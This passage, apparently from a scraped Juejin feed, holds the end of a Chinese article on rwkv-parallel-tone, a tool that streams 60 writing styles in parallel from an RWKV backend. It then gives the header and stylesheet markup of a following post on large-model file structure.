<p>如果你更喜欢用 <code>Docker</code>，项目也提供了完整的 <code>Docker</code> 支持。<code>docker compose up --build -d</code> 一条命令搞定，不用操心环境配置的问题。</p>
<h2 data-id="heading-5">API 配置</h2>
<p><code>API</code> 配置就两个参数：服务地址和密码。项目根目录下有个 <code>.env</code> 文件，里面写好了默认值。如果你有自己的 <code>RWKV</code> 后端服务，改一下这个文件就行，改完重启一下开发服务器。</p>
<pre><code class="hljs language-bash" lang="bash">PUBLIC_RWKV_API_URL=http://192.168.0.12:8000/v1/chat/completions
PUBLIC_RWKV_PASSWORD=rwkv7_7.2b_webgen
</code></pre>
<p>就这么简单。</p>
<h2 data-id="heading-6">60 种风格是怎么设计出来的</h2>
<p>60 种风格不是拍脑袋想出来的，而是根据实际使用场景一点点积累起来的。最开始只有十几种，后来发现不够用，就不断补充。</p>
<p>职场类是最早做的一批。面向老板、面向客户、面向同事，这三个场景的语气差异非常大。跟老板汇报工作，得用"敬请指示"、"恭候佳音"这种正式表达。跟客户沟通，得强调"为您服务"、"满足您的需求"。跟同事交流，就可以"咱们商量一下"、"一起搞定"。</p>
<p>文学类是后来加的。有用户反馈说想要古风文案，于是就做了红楼梦、三国演义、水浒传这些经典名著的风格。还有诗词歌赋、文言文这些。效果还不错，生成出来的内容确实有那个味道。</p>
<p>方言类比较有意思。东北话、四川话、广东话、上海话，每种方言都有自己的特色词汇。东北话喜欢说"咋整"、"贼拉"，四川话爱用"哦豁"、"巴适"，广东话常说"饮茶"、"搞掂"。这些方言风格在做地方性推广时特别有用，能快速拉近和用户的距离。</p>
<p>网络用语风格是必须有的。现在的年轻人说话都是"yyds"、"绝绝子"、"EMO 了"这些梗。如果做社交媒体运营，不用这些网络语言，内容就会显得很生硬。所以专门做了几个网络用语风格，紧跟最新的流行趋势。</p>
<p>除了这些大类，还有一些更细分的场景风格。比如道歉、感谢、邀请、拒绝、催促等。这些在日常沟通中经常用到，但很多人不知道怎么表达得既礼貌又不失分寸。有了这些风格，直接套用就行。</p>
<h2 data-id="heading-7">实时看到生成进度</h2>
<p>因为是流式响应，所以你可以实时看到每个风格的生成进度。不同风格的生成速度可能不一样，有的快有的慢，但每个都是独立更新的，互不影响。</p>
<p>这种体验比传统的"转圈等待"好太多了。你能看到文字一个个蹦出来，知道 AI 确实在工作，而不是卡住了。而且因为是并发的，所以很多风格会同时在生成，界面上到处都在更新内容，看起来特别有动感。</p>
<p>每个卡片右上角有个复制按钮，点一下就复制到剪贴板了。如果对结果不满意，底部有个"重新生成"按钮，会用同样的输入再跑一遍。</p>
<h2 data-id="heading-8">后端 API 要求</h2>
<p>后端 <code>API</code> 需要支持以下特性：</p>
<ol>
<li>接收一个 <code>contents</code> 数组，数组里有多少个 <code>prompt</code> 就要并发处理多少个任务</li>
<li>返回 <code>SSE</code> 格式的流式数据，每个 <code>choice</code> 必须包含 <code>index</code> 字段用于标识对应的任务</li>
<li>所有任务完成后发送 <code>"data: [DONE]"</code> 标记</li>
</ol>
<p>推荐使用 <code>RWKV Lightning</code> 作为后端服务（<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FRWKV-Vibe%2Frwkv_lightning%25EF%25BC%2589%25EF%25BC%258C%25E5%25AE%2583%25E5%25A4%25A9%25E7%2584%25B6%25E6%2594%25AF%25E6%258C%2581%25E8%25BF%2599%25E4%25BA%259B%25E7%2589%25B9%25E6%2580%25A7%25E3%2580%2582%25E5%25A6%2582%25E6%259E%259C%25E4%25BD%25A0%25E7%2594%25A8%25E5%2585%25B6%25E4%25BB%2596%25E5%2590%258E%25E7%25AB%25AF%25EF%25BC%258C%25E5%258F%25AA%25E8%25A6%2581%25E6%25BB%25A1%25E8%25B6%25B3%25E4%25B8%258A%25E9%259D%25A2%25E4%25B8%2589%25E4%25B8%25AA%25E6%259D%25A1%25E4%25BB%25B6%25E5%25B0%25B1%25E8%2583%25BD%25E6%258E%25A5%25E5%2585%25A5%25E3%2580%2582" target="_blank" title="https://github.com/RWKV-Vibe/rwkv_lightning%EF%BC%89%EF%BC%8C%E5%AE%83%E5%A4%A9%E7%84%B6%E6%94%AF%E6%8C%81%E8%BF%99%E4%BA%9B%E7%89%B9%E6%80%A7%E3%80%82%E5%A6%82%E6%9E%9C%E4%BD%A0%E7%94%A8%E5%85%B6%E4%BB%96%E5%90%8E%E7%AB%AF%EF%BC%8C%E5%8F%AA%E8%A6%81%E6%BB%A1%E8%B6%B3%E4%B8%8A%E9%9D%A2%E4%B8%89%E4%B8%AA%E6%9D%A1%E4%BB%B6%E5%B0%B1%E8%83%BD%E6%8E%A5%E5%85%A5%E3%80%82" ref="nofollow noopener noreferrer">github.com/RWKV-Vibe/r…</a></p>
<h2 data-id="heading-9">写在最后</h2>
<p>这个工具的核心价值就是一个字：快。</p>
<p>传统方式要生成 60 种风格，得等 2 分钟。现在并发生成，只要 2 秒钟。效率提升了 60 倍，这才是真正有用的工具。</p>
<p>当然，60 种风格只是开始。随着使用场景的增加，肯定还会有更多风格加进来。好在添加新风格很简单，改几行配置就行。</p>
<p>如果你有什么想法或建议，欢迎提 <code>Issue</code> 或 <code>PR</code>。这个工具会持续优化，让更多人受益。</p>
<p>项目地址：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FRWKV-Vibe%2Frwkv-parallel-tone" target="_blank" title="https://github.com/RWKV-Vibe/rwkv-parallel-tone" ref="nofollow noopener noreferrer">rwkv-parallel-tone</a></p>
<p>后端服务：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FRWKV-Vibe%2Frwkv_lightning" target="_blank" title="https://github.com/RWKV-Vibe/rwkv_lightning" ref="nofollow noopener noreferrer">RWKV Lightning</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[大模型训练全流程实战指南基础篇（二）——大模型文件结构解读与原理解析]]></title>    <link>https://juejin.cn/post/7594728203258347554</link>    <guid>https://juejin.cn/post/7594728203258347554</guid>    <pubDate>2026-01-14T05:15:41.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594728203258347554" data-draft-id="7593573617647271988" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="大模型训练全流程实战指南基础篇（二）——大模型文件结构解读与原理解析"/> <meta itemprop="keywords" content="人工智能,PyTorch,LangChain"/> <meta itemprop="datePublished" content="2026-01-14T05:15:41.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="大模型真好玩"/> <meta itemprop="url" content="https://juejin.cn/user/3140624091453053"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            大模型训练全流程实战指南基础篇（二）——大模型文件结构解读与原理解析
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3140624091453053/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    大模型真好玩
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-14T05:15:41.000Z" title="Wed Jan 14 2026 05:15:41 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-14
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    3
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读15分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252b3a}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px;color:#5e7ce0}.markdown-body h1{font-size:24px;margin-bottom:5px;margin-top:80px;position:relative;text-align:center}.markdown-body h2{font-size:20px;padding-bottom:12px;border-bottom:1px solid #dfe1e6}.markdown-body h3{font-size:18px;padding-bottom:0}.markdown-body h4{font-size:16px;margin-top:30px}.markdown-body h5{font-size:14px;margin-top:20px}.markdown-body h6{font-size:14px;margin-top:5px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #dfe1e6;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#ffeeed;color:#c73636;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#252b3a;background:#f8f8f8}.markdown-body a{position:relative;text-decoration:none;color:#5e7ce0;padding-right:18px;padding-bottom:4px}.markdown-body a[href^=http]:after{position:absolute;display:inline-block;width:16px;height:16px;margin-left:2px;margin-top:6px;content:"";background:url("data:image/png;base64,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");background-size:100%}.markdown-body a:active,.markdown-body a:hover{border-bottom:2px solid #5e7ce0}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #5e7ce0;border-spacing:0}.markdown-body thead{color:#fff;text-align:left}.markdown-body thead tr{background:#5e7ce0}.markdown-body thead th{border-bottom:1px solid #dfe1e6}.markdown-body tr{background-color:#fff}.markdown-body tr:nth-child(2n){background-color:#f2f5fc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#252b3a;padding:1px 23px;margin:22px 0;border-left:4px solid #5e7ce0;background-color:#f2f5fc}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{padding-left:10px;margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol li::marker,.markdown-body ul li::marker{color:#5e7ce0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body ul li::marker{content:"•";color:#5e7ce0}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}.markdown-body input[type=checkbox]:before{display:inline-block;width:16px;height:16px;content:"";background:url("data:image/png;base64,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");background-size:100%;position:relative;right:2px;top:-5px}.markdown-body input[type=checkbox]:checked:before{background:url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAEIAAABCCAYAAADjVADoAAAK2GlDQ1BJQ0MgUHJvZmlsZQAASImVlwdUU9kWhs+96Y0WiHRC70gngJTQQxGkg6iEJJBQYkgIKmJnUMGxoCKCZcSKKFhGQMaCWLANAopdJ8igoD4HC6Ki5t3AI8zMW++99fZaJ+dbO/vss/e55671XwAoYWyRKBdWAyBPWCCODQ2gJ6ek0nHPAQRgQAI2wIHNkYiYMTGRALHJ+a/28S4Sjdhte0Wuf///v5oGlyfhAAClIZzBlXDyEG5DxkuOSFwAAOoI4jddUCBScBfCmmKkQIR/V3DWBH9ScMY4o8njMfGxgQjTAcCT2WxxFgBkO8RPL+RkIXnIih4chVyBEOFihH05fDYX4TMI2+XlzVfwIMJWSLwIAApyOoCR8aecWX/Jn6HMz2ZnKXmir3HDBwkkolz2ov/zaP635eVKJ/ewQAaZLw6LVeyHnN/9nPkRShZmzIyeZAF3oiYF86VhCZPMkQSmTjKXHRShXJs7M3KSMwUhLGWeAlb8JPMkwXGTLJ4fq9wrUxzInGS2eHxfIsIyaU6C0s/nsZT5i/jxSZNcKEicOcmSnLiIqZhApV8sjVXWzxOGBkztG6LsPU/yp34FLOXaAn58mLJ39lT9PCFzKqckWVkblxcUPBWToIwXFQQo9xLlxijjebmhSr+kME65tgC5nFNrY5RnmM0Oj5lkIABRgA04dNVJAqCAt7BA0UjgfNEisSCLX0BnIm8bj84Schzs6M6Ozs4AKN7dievwnjb+TkK061O+NYjHr10ul5+e8oUi9/i4KfJYbk35LCsAUNUD4Op+jlRcOOFDK34wyNNTBZpABxgCU2AF7IEzcAfewB8Eg3AQDeJBCpiL1MoHeUAMFoBisAKUgnKwEWwF1WA32AsOgaPgBGgGZ8AFcAXcAF2gFzwCMjAAXoFh8BGMQRCEgygQFdKBjCBzyBZyhhiQLxQMRUKxUAqUDmVBQkgKFUOroHKoAqqG9kB10HHoNHQBugZ1Qw+gPmgIegd9gVEwGdaEDWALeDrMgJlwBBwPz4Gz4Hy4CC6B18NVcC18BG6CL8A34F5YBr+CR1AARULRUMYoexQDFYiKRqWiMlFi1FJUGaoSVYtqQLWiOlC3UTLUa9RnNBZNRdPR9mhvdBg6Ac1B56OXotehq9GH0E3oS+jb6D70MPo7hoLRx9hivDAsTDImC7MAU4qpxBzAnMJcxvRiBjAfsVgsDWuJ9cCGYVOw2djF2HXYndhGbBu2G9uPHcHhcDo4W5wPLhrHxhXgSnHbcUdw53E9uAHcJzwJb4R3xofgU/FC/Ep8Jf4w/hy+B/8CP0ZQI5gTvAjRBC5hEWEDYR+hlXCLMEAYI6oTLYk+xHhiNnEFsYrYQLxMfEx8TyKRTEiepFkkAWk5qYp0jHSV1Ef6TNYg25ADyWlkKXk9+SC5jfyA/J5CoVhQ/CmplALKekod5SLlKeWTClXFQYWlwlVZplKj0qTSo/JGlaBqrspUnatapFqpelL1luprNYKahVqgGlttqVqN2mm1e2oj6lR1J/Vo9Tz1deqH1a+pD2rgNCw0gjW4GiUaezUuavRTUVRTaiCVQ11F3Ue9TB3QxGpaarI0szXLNY9qdmoOa2louWolai3UqtE6qyWjoWgWNBYtl7aBdoJ2l/ZlmsE05jTetLXTGqb1TB